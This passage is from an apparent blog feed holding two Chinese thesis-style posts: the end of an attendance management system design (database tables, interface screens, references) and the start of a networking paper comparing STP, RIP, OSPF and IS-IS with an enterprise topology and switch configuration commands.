0    |           | 性别     || 5    | `birthday`          | date    | 0    |           | 生日     || 6    | `telephone`         | varchar | 20   |           | 联系方式 || 7    | `email`             | varchar | 30   |           | 邮箱     || 8    | `address`           | varchar | 50   |           | 地址     || 9    | `photo`             | varchar | 50   |           | 照片     || 10   | `education`         | varchar | 20   |           | 教育     || 11   | `department_number` | Int     | 10   |           | 部门编号 || 12   | `position_number`   | Int     | 10   |           | 职称编号 || 13   | `in_time`           | date    | 0    |           | 参加时间 || 14   | `out_time`          | varchar | 0    |           | 离职时间 || 15   | `notes`             | varchar | 255  |           | 备注     || 16   | `status`            | varchar | 255  |           | 状态     |<p><code>lea</code>表结构设计如表3-9所示。</p><center>表3-9 lea表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | `department_number` | varchar | 10   |           | 部门编号 || 4    | `start_time`        | enum    | 0    |           | 入职时间 || 5    | `end_time`          | date    | 0    |           | 离职时间 || 6    | `days`              | varchar | 10   |           | 天数     || 7    | `reason`            | varchar | 100  |           | 原因     || 8    | `type`              | varchar | 0    |           | 类型     || 9    | `manager`           | varchar | 10   |           | 管理人   || 10   | `notes`             | varchar | 255  |           | 备注     || 11   | `status`            | varchar | 255  |           | 状态     |<p><code>move</code>表结构设计如表3-10所示。</p><center>表3-10 move表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 10   | 主键      | ID       || 2    | `employee_number` | int     | 10   |           | 员工编号 || 3    | `before`          | varchar | 10   |           | 之后     || 4    | `after`           | Varchar | 10   |           | 之前     || 5    | `time`            | date    | 0    |           | 时间     || 6    | `manager`         | varchar | 10   |           | 管理人   || 7    | `notes`           | varchar | 255  |           | 备注     |<p><code>overtime</code>表结构设计如表3-11所示。</p><center>表3-11  overtime表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | `department_number` | varchar | 10   |           | 之后     || 4    | `day`               | Varchar | 0    |           | 之前     || 5    | `time`              | date    | 0    |           | 时间     || 6    | `manager`           | varchar | 0    |           | 管理人   || 8    | `status`            | varchar |      |           | 状态     |<p><code>position</code>表结构设计如表3-12所示。</p><center>表3-12 position表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 10   | 主键      | ID       || 2    | `position_number` | int     | 10   |           | 职称编号 || 3    | `name`            | varchar | 20   |           | 名称     || 4    | `level`           | Varchar | 0    |           | 级别     || 5    | `notes`           | varchar | 255  |           | 备注     |<h3 id="4系统实现展示">4系统实现展示</h3><h4 id="4-1-登陆界面">4.1 登陆界面</h4><p>在此界面输入账号密码进入系统，如图4-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\登陆界面.jpg" style="zoom:50%;" /><center>图4-1 登陆界面</center>#### 4.2 系统首页 <p>不同权限用户进入不同的首页，具体区别在于可以使用的功能不同，如图4-2所示是普通员工首页，管理员首页左侧有本系统支持的各种功能，点击可以展开并跳转到该功能界面，在系统首页可以签到签退，在签到签退按钮下方会显示最新公告以便于查看，首页右上方可以退出系统登录，如图4-3所示</p><h4 id="4-3-系统个人信息模块功能">4.3 系统个人信息模块功能</h4><h5 id="4-3-1-查看个人信息：">4.3.1 查看个人信息：</h5><p>在此界面可以查看职工个人信息，如图4-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\查看个人信息.jpg" style="zoom: 67%;" /><center>图4-6 查看个人信息</center>##### 4.3.2 查看考勤记录：<p>可以查看各员工的签到时间，签退时间等考勤信息，如图4-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\考勤信息查看.jpg" style="zoom: 80%;" /><center>图4-7 考勤信息查看</center>##### 4.3.3 查看加班信息<p>查看加班信息支持查看加班信息的查看以及安排加班，如图4-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班信息查看.jpg" style="zoom:80%;" /><center>图4-8 加班信息查看</center>安排加班需要通过下拉栏选定员工和时间来安排加班，各项信息都是必填，倘若未填写则会有红字报错提醒<h5 id="4-3-4-申请请假">4.3.4 申请请假</h5><p>若企业员工需要请假，可以通过申请请假界面来实现请假操作，如图所示，员工需要填写各项信息，若必填信息未填写则会有提醒。如图4-10所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\申请请假.jpg" style="zoom:80%;" /><center>图4-10 申请请假</center>##### 4.3.5 查看请假记录<p>查看请假记录可以实现对请假列表的查看，请假列表包含了请假人姓名，请假时间、请假原因和审批状态等信息，如图4-11所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\查看请假记录.jpg" style="zoom: 80%;" /><center>图4-11 查看请假记录</center>#### 4.4 系统员工模块功能 <p>系统员工模块实现对员工信息的管理、考勤管理以及请假管理。</p><h5 id="4-4-1-员工管理">4.4.1 员工管理</h5><p>员工管理包括在职员工管理、离休员工管理、员工档案管理三项。在职员工管理可以查看在职员工信息并进行修改和删除，删除只需点击删除按钮即可，如图4-12所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\在职员工管理.jpg" style="zoom:80%;" /><center>图4-13 在职员工管理</center>添加员工需要按格式输入各项信息，其中有必填信息是必须要填写的，否则会有报错提醒，如图4-13所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加员工.jpg" style="zoom: 67%;" /><center>图4-13 添加员工</center>离休员工管理可以查看离休员工列表，获取离休时间等信息。如图4-14所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\离休员工管理.jpg" style="zoom: 80%;" /><center>图4-14 离休员工管理</center>##### 4.4.2考勤管理<p>考勤管理包含考勤管理和加班管理两项，其中考勤管理可以查看各员工的考勤记录，如图4-15所示。加班管理则是可以安排加班，如图4-16所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\员工考勤记录.jpg" style="zoom: 80%;" /><center>图4-15 员工考勤记录</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班管理.jpg" style="zoom: 80%;" /><center>图4-16 加班管理</center>加班管理可以安排人员加班，也可以修改和删除加班信息，安排加班具体如图4-17所示。修改加班信息如图4-18所示。删除加班信息点击删除按钮即可，如图4-16所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加加班安排.jpg" style="zoom: 80%;" /><center>图4-17 添加加班安排</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班信息修改.jpg" style="zoom: 80%;" /><center>图4-18 加班信息修改</center>##### 4.4.3 请假管理<p>请假管理是管理员功能，可以查看已批准和未批准的请假以及请假记录，如下图4-19所示，在请假记录一栏中可以看到各项已批准和未批准的请假记录，如图4-20所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\请假列表.jpg" style="zoom:80%;" /><center>图4-20 请假列表</center>#### 4.5 系统部门模块功能<p>部门管理模块是管理员功能，其中有两部分，分别为部门管理和职称管理。</p><h5 id="4-5-1部门管理">4.5.1部门管理</h5><p>部门管理页面展示了如部门名称、部门电话、部门地址等信息，通过此界面可以实现对部门的查看、添加和删除，对部门信息的修改功能，如图4-21所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\部门管理.jpg" style="zoom: 80%;" /><center>图4-21 部门管理</center>对部门的添加需要按格式输入部门的各项信息，如果出错则会报错提示，如图4-22所示：<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加部门.jpg" style="zoom:80%;" /><center>图4-22 添加部门</center>修改部门信息则需要在原信息基础上修改，如图4-23所示，修改完成后会弹窗提示修改成功，如图4-24所示：<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改部门信息.jpg" style="zoom:80%;" /><center>图4-23 修改部门信息</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改成功提示.jpg" style="zoom:80%;" /><center>图4-24 修改成功提示</center>##### 4.5.2 职称管理  <p>职称管理与部门管理大致相同，其实现了对职称的查看、添加、修改和删除。如图4-25所示，界面中展示了已有职称的信息，如要增删改需要按下相关按钮</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称管理.jpg" style="zoom:80%;" /><center>图4-25 职称管理</center>如图4-26所示为添加职称，其中职称名称为必填选项，如果未填写会有错误提示，职称的权限可以通过下拉栏来选择。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称添加.jpg" style="zoom:80%;" /><center>图4-26 职称添加</center>对职称的修改需要点击修改按钮，在原基础上进行修改，如图4-27所示<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称修改.jpg" style="zoom:80%;" /><center>图4-27 职称修改</center>#### 4.6 系统公告模块功能<h5 id="4-6-1公告管理">4.6.1公告管理</h5><p>公告管理中可以对公告进行查看、添加、修改、删除，如图4-28所示。添加公告时需要输入公告标题和内容，如图4-29所示。修改可以修改公告的标题和内容，如图4-30所示。删除只需点击删除按钮即可。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\公告管理.jpg" style="zoom:80%;" /><center>图4-28 公告管理</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加公告.jpg" style="zoom:80%;" /><center>图4-29 添加公告</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改公告.jpg" style="zoom: 80%;" /><center>图4-30 修改公告</center>### 5 结束语<p>企业考勤管理系统是为了解决员工考勤管理而设计的,目的是建立一个能够初步实现企业考勤管理系统的智能化管理,提高考勤管理效率,工作人员能够在各个岗位上的工作状态得到及时的反馈,而系统所需的工作人员的数量少,效率高，是一个企业单位不可缺少的一部分。企业考勤管理系统的开发是一项系统性工程，它不但涉及JSP、Web、数据库技术等技术领域，还涉及到管理观念、管理体制和管理科学，以及一些制度和人为的因素。因此，系统开发的各个环节都需要有效地衔接，有条不紊的进行。本文研究的主要目的是为了开发一个智能化、高效率的企业考勤管理系统。在本项目中我们初步分析了企业考勤管理系统的几个主要模块的功能与作用，经多次调试，该系统基本能够达到预期的效果。本系统是基于Web的企业考勤管理系统。由于企业考勤管理系统本身的复杂性，以及我们能力、开发技术的局限性，此系统还存在不少的缺陷和漏洞，有待进一步的改进和研究。</p><h3 id="参考文献：">参考文献：</h3><p>[1] 尚中君.探析JAVA编程语言在计算机软件开发中的应用[J].信息记录材料,2021,22(03):176-178.</p><p>[2] 朱宝善,陈光浦,李鹏程,王深.基于B/S模式和MySQL的人力资源管理系统设计[J].现代电子技术,2021,44(14):65-69.</p><p>[3] 张淼,刘东旭.基于JavaEE的人力资源管理系统的设计与实现[J].普洱学院学报,2020,36(03):35-36.</p><p>[4] 张艳明.动态网页开发Servlet基础实验综述[J].电脑知识与技术,2019,15 (20):80-82.</p><p>[5] 王军.计算机网络环境下的大学就业信息网研究[J],中国宇航出版社,2019,(10),115-117.</p><p>[6] 韩坤,林关成,安嘉豪,陈泽.基于B/S的高校学生学业预警系统设计与实现[J].信息技术,2021,(08):53-58.</p><p>[7] 王烽杰,郭玉靖.JAVA编程语言在计算机软件开发中运用[J].大众标准化,2020,(18):66-67.</p><p>[8] 赵国文,夏平平.基于JavaEE的人事管理系统的设计与实现[J].现代工业经济和信息化,2019,9(11):88-89.</p><p>[9] 王佳林,郭炀.基于计算机软件开发Java编程语言的分析研究及技术思考[J].科技风,2019,(33):108.</p><p>[10] 李琼.基于三层B/S架构的企业信息化管理系统的设计与实现[J].信息与电脑(理论版),2021,33(04):126-128.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;智能考勤系统的设计与实现&quot;&gt;智能考勤系统的设计与实现&lt;/h2&gt;
&lt;p&gt;**摘要：**在经历过疫情严重的生活后，网上招聘就业越来越流行，人才市场就业愈发激烈，所以使用开发工具IDEA、SPRING等技术学习开发的企业智能考勤信息系统。帮助企业更高效的管理员工信息以及</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="Java Spring" scheme="https://shierjinghuang.github.io/tags/Java-Spring/"/>
    
    <category term="Tomcat" scheme="https://shierjinghuang.github.io/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>网络互联技术的研究与应用</title>
    <link href="https://shierjinghuang.github.io/2024/08/02/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%81%94%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    <id>https://shierjinghuang.github.io/2024/08/02/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%81%94%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8/</id>
    <published>2024-08-02T08:55:27.000Z</published>
    <updated>2025-04-02T09:18:01.700Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络互联技术的研究与应用">网络互联技术的研究与应用</h2><p>**摘要：**目前的网络技术以高性能化、高传输效率和高品质的网络服务质量为目标，但现网中仍存在诸多亟需解决的问题。本文首先分析交换网络中涉及的问题，详细比较OSPF协议与IS-IS协议的特征和应用场景。其次，以工程拓扑、工程实施和工程步骤为主体，提出包含运营商和企业业务网络的拓扑结构，并详细阐述协议的部署过程，该结构可适用于企业总部与分支机构之间的互联。最后，分析了MSTP、OSPF和BGP协议的实施效果，并对网络进行优化，在一定程度上解决了网络中存在的数据风暴、路由环路和利用率问题，满足企业实际应用需求，可为当今企业承载高质量的数据通信业务。</p><p>**关键词：**网络互联  MSTP  OSPF IS-IS 网络优化</p><h3 id="引言">引言</h3><p>网络互联是指利用现有的网络设备与技术将不同地区、不同地理位置的独立自治系统连接在一起，形成一个更大的网络，实现单独自治系统的数据互通，使各个独立自制系统实现资源共享。在连接不同计算机或是不同工作站、服务器的时候，除了需要必要的连接器之外，还需要一些中介连接设备，这些设备之间又通过各种协议维护着网络动态平衡。</p><p>Internet时代的到来，使得基于互联网的应用越来越广泛，每天网络中都在交换大量的网络数据。互联网在医学方面、军事方面、学术方面、金融方面等都具有十分重大的意义。在一些金融领域，对网络响应速度的要求能达到毫秒级，有的公司为了提升几毫秒的响应速度，使用几百万资金来升级网络设备^[1]^。如果出现网络延迟，甚至网络中断，往往会造成很大的经济损失。</p><h3 id="1-网络互联设备">1  网络互联设备</h3><h4 id="1-1-交换机">1.1  交换机</h4><p>交换机外观上类似于集线器，所以也称交换式集线器，是简化的网桥。交换机可以看成高级的网桥设备，其端口数量远远大于网桥，而且具有很高的网络传输效率。</p><h5 id="1-1-1-二层交换机">1.1.1  二层交换机</h5><p>以太网交换机，一般用来连接类型相同的LAN，进行二层交换。交换机转发时会收到不同类型的数据帧，在网络上传播的数据帧可分为单播帧、未知单播帧、组播帧、广播帧，对不同类型的数据帧交换机处理方式也不尽相同。当交换机查找到此帧目的MAC地址是一个单播MAC地址时，经过对比交换机的MAC地址表发送到对应的接口，当交换机本地MAC地址表中查不到数据包中相对应的MAC地址信息，则此数据帧为未知单播帧，会将此数据帧泛洪处理。如果交换机收到目的MAC地址二进制高八位的第八位为1，则此数据帧为组播帧，会将数据帧泛洪到适当的组播组^[2]^。当交换机收到目的MAC地址为FF-FF-FF-FF-FF-FF时，此数据帧为广播帧，此数据帧则会泛洪处理。</p><h5 id="1-1-2-三层交换机">1.1.2  三层交换机</h5><p>三层交换机支持路由交换，可以在二层和三层工作，通过IP地址寻找通往目标网段的路径，数据帧会发生变化，封装成新的数据帧。</p><p>三层交换机在保留了二层交换机方便的VLAN规划技术和高处理速度的基础上，添加了三层的功能，通过硬件完成三层报文的高速传输，也降低了网络环境的复杂性。</p><h4 id="1-2-路由器">1.2  路由器</h4><h5 id="1-2-1-路由器简介">1.2.1  路由器简介</h5><p>路由器和网桥类似，通常在网络层工作，用于转化网络层上的协议，把逻辑上互相孤立的网络连接起来^[3]^。在使用路由器互联的网络中，每个子网都拥有自己的网络地址。当一个网络中的计算机要将数据发送给另一个网络中的主机时，首先需要将数据包发送给本网段的路由器，路由器会根据数据包中目的网段信息，查看由路由器间互相运行的路由协议生成的路由表，选择合适的路由进行转发，将数据交给正确的接收者。路由器通过软件实现功能，传输效率低，数据报文延迟比较大。</p><h5 id="1-2-2-路由器的功能">1.2.2  路由器的功能</h5><p>路由器的主要用于不同的子网在数据交换时选择正确的路由，路由器的常用功能包含下述三个方面。</p><ol><li>网络互联：可以将相同的或者不同的网络进行互联。</li><li>数据的处理：路由器可以将数据包进行分组过滤、分组转发、标记不同优先级（QoS）、加密等操作。</li><li>网络的管理：路由器可以通过不同路由策略来控制网络中不同流量的走向。</li></ol><h3 id="2-交换机协议">2  交换机协议</h3><h4 id="2-1-交换机网络中涉及的问题">2.1  交换机网络中涉及的问题</h4><p>通常交换机收到数据帧，会判断此数据帧的类型，除了已知单播帧会通过MAC地址表转发到相应的接口外，其他类型的数据帧都会进行泛洪处理，所以在交换网络中，如果没有任何措施有很大可能会产生数据风暴，如2-1所示</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\数据风暴.png"  /><center>图2-1 数据风暴</center><p>交换机通过绑定数据包中源MAC地址信息与相对应的接口来形成MAC地址表。如果网络中出现环路，会影响交换机中MAC地址表的正常生成令交换机中MAC地址表频繁变化，如图2-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\MAC地址表震荡.png" style="zoom:80%;" /><center>图2-2 MAC地址表震荡</center><p>当交换机网络中出现上述问题时，会影响整个网络质量，正常数据包无法正常的在网络中传递，占用带宽资源，形成数据风暴，如果问题不能及时解决，最终会导致业务受到巨大影响，甚至网络瘫痪^[4]^。</p><h4 id="2-2-交换机stp协议的实现">2.2  交换机STP协议的实现</h4><p>交换机运行生成树（Spanning Tree Protocol，STP）协议，主要是通过在交换机之间传递网桥协议数据单元（Bridge Protocol Data Unit，BPDU），来形成二层网络的“树”，STP通过在网络中形成一颗无环的“树”来解决网络中有可能出现的环路，主要通过选举根交换机、根端口和指定端口实现。</p><h5 id="2-2-1-选举根交换机：">2.2.1 选举根交换机：</h5><ol><li>交换机标识的构成是16比特长度的交换机优先级加上48比特长度的MAC地址。</li><li>交换机默认使用32768作为优先级，可以配置为0到65535之间的数值。</li><li>网络中BID数值最小的成为根交换机，可以看成先比较BID中16比特长度的交换机优先级，当优先级无法选举出根交换机时，再对比48比特长度MAC地址。</li></ol><h5 id="2-2-2-选举根端口：">2.2.2 选举根端口：</h5><ol><li><p>首先比较非根交换机端口到达根交换机根路径开销（Root Path Cost）。</p></li><li><p>端口Link的上游交换机的BID，数值小的优先。</p></li><li><p>端口上Link的上行端口的PID（Port Identifier），数值小的优先。</p></li></ol><h5 id="2-2-3-选举指定端口：">2.2.3 选举指定端口：</h5><ol><li><p>首先比对该网段所有的端口所属交换机距离根交换机的距离，距离越近越优先。</p></li><li><p>比较所有交换机端口的交换机标识，交换机标识小的成为指定端口。</p></li><li><p>比较所有交换机端口的端口标识，端口标识小的成为指定端口。</p></li></ol><h3 id="3-路由器协议">3  路由器协议</h3><h4 id="3-1-路由协议简介">3.1  路由协议简介</h4><p>路由器提供了网络互联的机制，它能够将一个子网的数据包传递给另一个子网，从而实现子网之间的互相通信。路由器直接可以通过路由协议互相沟通收集网络中的信息，从而形成去往目标网段最优的路由条目。</p><h4 id="3-2-路由协议分类与特点">3.2  路由协议分类与特点</h4><p>路由协议按照其工作范围可以分为内部网关协议（Interior Gateway Protocol，IGP）与外部网关协议（Exterior Gateway Protocol, EGP），路由信息协议（Routing Information Protocol，RIP）、开放式最短路径优先（Open Shortest Path First，OSPF）、中间系统到中间系统（Intermediate System-to-Intermediate System，IS-IS）等属于IGP协议，边界网关协议（Border Gateway Protocol，BGP）等属于EGP协议^[5]^。</p><p>RIP基于UDP协议，端口号为520。无确认机制，无邻居概念，占用设备性能资源少。</p><p>BGP是基于TCP的，距离远、单播、要建立可靠的连接，如发送hello报文后，可以通过TCP的三次握手确认，端口号为179，使协议更加可靠。BGP用来在域间传递路由，所以要求有非常高的可靠性，从而使用TCP来保障稳定性。前提是在建立BGP会话前，需要先进行TCP连接，即通常所谓的IP网络的连通性。而建立BGP邻居的设备不要求直连，可以跨设备建立BGP邻居。</p><p>OSPF是基于IP的，协议号为89，因此它只支持IP网络。但由于IP层是不可靠的，OSPF开发了许多确认机制（hello包的邻居列表，DD报文使用seq做隐式确认，LSR/LSU/LSACK之间的相互确认）。基于IP的会话可以使用组播发送协议报文， OSPF可以自己发现邻居，并且建立邻居关系，但工作在IP及以上的协议较易于受到安全威胁。</p><p>IS-IS是基于数据链路层的，在特征上类似与OSPF，不同的是IS-IS收敛速度更快，并可以支持多种三层网络协议，包括非IP网络协议，而且具有较高的安全性。</p><h4 id="3-3-rip协议分析">3.3  RIP协议分析</h4><p>RIP协议作为一种IGP协议，可以进行动态路由选择，用来传递网络内的路由信息。RIP协议使用距离矢量算法，通过“跳数”来判断路由的优先级。RIP的路由器只知道自己周围路由器，只与他们交换路由信息。RIP广泛应用在网络中，主要有以下优点。</p><ol><li>相比其他IGP协议，占用设备系统资源少</li><li>相比静态路由可以动态的感知线路是否存在故障</li><li>适合用在对网络环境质量要求不高的小型网络，和一些大型网络的末梢节点等</li><li>相比其他IGP协议，没有邻居的概念，不用发送hello报文</li></ol><p>但RIP的缺陷也较为明显，主要包含下述四个方面</p><ol><li>RIP每30秒会向其他路由器更新所有路由信息，链路开销大，特别是在广域网链路上</li><li>RIP收敛慢，如准备切换需要180秒，路由的更新是一跳一跳传播</li><li>最大的跳数为16跳，限制了网络直径，不适合大型网络</li><li>最大跳数为16跳，无法根据实际链路状态来选择最优路径，不精确</li></ol><h4 id="3-4-ospf与is-is协议分析">3.4  OSPF与IS-IS协议分析</h4><h5 id="3-4-1-ospf与is-is协议简介">3.4.1  OSPF与IS-IS协议简介</h5><p>OSPF是一种IGP 协议，OSPF路由器会收集区域内所有LSA信息，形成一个LSDB，而后每台路由器通过自己的LSDB信息库以自己为根计算出一颗最短路径树</p><p>IS-IS是ISO组织针对OSI模型研发的协议，最初是应用在数据链路层，随着IP网络环境的推广流行，对IS-IS进行了扩展，使IS-IS适用于IP网络环境，这种扩展的IS-IS叫做集成IS-IS，IS-IS既可以运用在数据链路层，也可以用在IP层</p><p>OSPF共有8种状态机。路由器处于Down状态，发出一个Hello包。当路由器从其他路由收到Hello包，并发现这个Hello包中含有自己的Router ID，这时自己和邻居进入Init状态。当两端都收到含有自己Router ID的Hello包后进入2-way状态</p><p>进入2-way后，将选举出DR/BDR。进入2-way状态后，两个路由器进入邻居状态。这时只是邻居关系，只有进入Full状态才真正进入邻接状态，才会同步LSDB信息。</p><p>在Exstart状态时会互相发送First DBD，选出主从关系，主设备首先发送报文，确定序列号。</p><p>在Exchange相互交换DBD来互相传递LSA头部信息。当收到M位为0的DBD报文后表示最后一个DBD报文，进入Loading状态。进入Loading状态后，开始发送LS request报文请求本地LSDB库中不存在的LSA信息。在收到LS request请求后，向对端回应LS update报文，在LS update报文中，包含了LS request中请求的LSA详细信息。路由器收到LS update报文之后，向对端回复LS ack报文作确认，保证LSA同步的可靠性。LSDB同步完成后，进入Full状态，邻接关系完整建立。</p><p>IS-IS建立邻居的方式有两种2-way握手与3-way握手，IS-IS在广播链路上只支持3-way握手</p><ol><li>2-way握手，本端路由器收到IS-IS hello报文，就会单方向建立起邻居关系。</li><li>3-way握手，只有当本段路由器收到含有自己的System ID，才会建立起邻居关系。</li></ol><h5 id="3-4-2-ospf与is-is对比">3.4.2 OSPF与IS-IS对比</h5><p>OSPF与IS-IS都可以划分出不同区域类型，如骨干区域、非骨干区域、Stub区域、NSSA区域，在设备组网中，设备性能有差异，我们将性能好的安放在骨干区域，性能较差的安放在特殊区域中，这样在特殊区域通过缺省路由来访问外部路由，避免了大量外部路由对性能差的设备的冲击。虽然IS-IS也拥有不同的区域，但是区域类型相比OSPF较少，只有level-1、 level-2两种，在同一区域中如果有很多level-1-2路由器作为本区域数据出口，有可能会出现次优路径问题，如果使用路由泄露功能，对路由器性能要求变高。</p><p>如果网络中链路类型非常复杂，例如有PPP、帧中继这样的链路，那么这种情况下，OSPF是比较好的，因为OSPF可以支持的多种网络类型，有Broadcast、NBMA、P2P、P2MP，IS-IS只支持Broadcast和P2P，而且在帧中继网络中不管主接口还是子接口都只支持P2P，这样邻居关系是非常多的。</p><p>OSPF控制路由的手段是非常丰富的，通过划分特殊区域可以控制，并且OSPF有3类LSA、5类LSA的过滤，3类LSA、5类LSA、7类LSA的汇总，对于引入的外部路由可以配置type1类型和type2类型，还可以使用路由策略对路由控制。对于IS-IS来说，是没有这么多的手段的。</p><p>OSPF与IS-IS都使用I-SPF和PRC将网络的收敛性能进一步提高，对OSPF来说， 在一个Area内，任何1类LSA与2类LSA的变化都触发I-SPF计算，只有3/4/5/7LSA的变化才触发PRC计算，而在IS-IS中，每条路由前缀都是当前节点的叶子，路由前缀的变化只触发PRC计算，相比OSPF在Area内，路由前缀变化会使用I-SPF而言，IS-IS收敛会快些。</p><p>IS-IS一般是用于数据链路层的，支持IP环境也支持非IP环境，如果后期要在网络中部署Ipv6的话，IS-IS只需要增加相应的TLV，将IS-IS中Ipv6的功能打开就可以实现。对与OSPF来说，要从Ipv4向Ipv6过渡，只能在网络中全部运行Ospfv3，配置量和复杂度都是相对较大的。而且IS-IS支持进程下配置3个Network-entity地址，可以方便网络区域的重新规划、平滑过渡。这也是IS-IS扩展性强的一个体现。</p><p>OSPF一般使用在IP层面，IS-IS一般使用在数据链路层，由于IP层的攻击要比数据链路层的多，所以从这个角度讲，IS-IS更安全一些。综合上述各个方面，OSPF与IS-IS的主要差异如表3-1所示，网络管理员可以根据自身网络对区域类型、链路类型、收敛速度等的要求，选择部署何种类型的路由协议。</p><center>表3-1 IS-IS与OSPF对比</center><table><thead><tr><th></th><th>区域类型</th><th>链路类型</th><th>路由控制</th><th>安全性</th><th>收敛速度</th><th>扩展性</th></tr></thead><tbody><tr><td>IS-IS</td><td>单一</td><td>单一</td><td>单一</td><td>攻击较少</td><td>极快</td><td>强</td></tr><tr><td>OSPF</td><td>丰富</td><td>丰富</td><td>丰富</td><td>攻击较多</td><td>快速</td><td>差</td></tr></tbody></table><h3 id="4-网络协议应用">4  网络协议应用</h3><p>在现实网络环境中，大部分企业公司内部都会采用OSPF协议来构建三层网络环境。在一些小型网络或者大型网络的末梢节点会使用RIP协议。但在运营商网络中，IS-IS协议是比较常用的，运营商网络常常使用BGP协议为企业与企业之间传递路由信息。二层网络中，使用最为广泛为MSTP技术，不同VLAN对应不同生成树。下面将通过实际工程案例设计分析网络协议的应用。</p><h4 id="4-1-工程介绍">4.1  工程介绍</h4><p>某一大型企业，在外地开设分公司，总公司内部网络复杂且需要保证网络质量与亢余性，不能出现环路，网络某链路出现问题时需要保证网络的连通性。子公司网络环境较简单，也需保证网络的畅通性。需公司总部与分部通过租用运营商网络实现互通。子公司拥有一台服务器，总部需要访问此服务器。</p><p>运营商网络下，只有与企业相连的两台路由器建立IBGP邻居，运营商网络内其它路由器不参与BGP邻居的建立</p><h4 id="4-2-工程拓扑">4.2  工程拓扑</h4><p>工程拓扑如图4-1所示，AS100为运营商区域，AS10为企业总部区域，AS20为企业分部。交换机之间使用MSTP协议防止环路，AS100运行IS-IS协议，AS10运行OSPF协议动态学习路由，AR20运行RIP协议学习路由。AS10通过BGP协议将路由信息传递给AS20</p><ol><li>每个路由器配置一个环回接口，IP配置为10.1.X.X（X为路由器编号）</li><li>路由器互联网段地址为10.1.XY.X（X为本段路由器标号，Y为对端路由器编号）</li><li>所有路由器手动配置Router ID，地址为本路由器环回接口地址。</li><li>AR6与AR7互联网段运行在区域0中，AR5与AR6互联网段运行在区域1中，AR5与AR6运行在区域2中</li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\工程拓扑.png" alt="工程拓扑" style="zoom:80%;" /><center>图4-1 工程拓扑</center><h4 id="4-3-工程实施">4.3  工程实施</h4><ol><li>LSW1、LSW2、LSW3使用MSTP技术防止网络中产生环路</li><li>AS10使用OPSF协议组网，AS100使用IS-IS组网，AS20使用RIP组网</li><li>AS100通过BGP将AS10路由信息传递给AS20，AS100通过BGP将AS20路由信息传递给AS10。使AS10与AS20可以互相访问。在AS100内AR1与AR3建立IBGP邻居，其他路由不建立BGP邻居</li><li>PC1、PC2、PC3、PC4可以互相访问。Client2可以访问Server1</li></ol><h4 id="4-4-工程步骤">4.4  工程步骤</h4><blockquote><p>LSW1、LSW2、LSW3上运行MSTP</p></blockquote><pre class="line-numbers language-cisco" data-language="cisco"><code class="language-cisco"># 在LSW1、LSW2、LSW3上配置命令如下[SW1] stp mode mstp[SW2] stp mode mstp[SW3] stp mode mstp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR1、AR2、AR3、AR4运行IS-IS协议，配置System 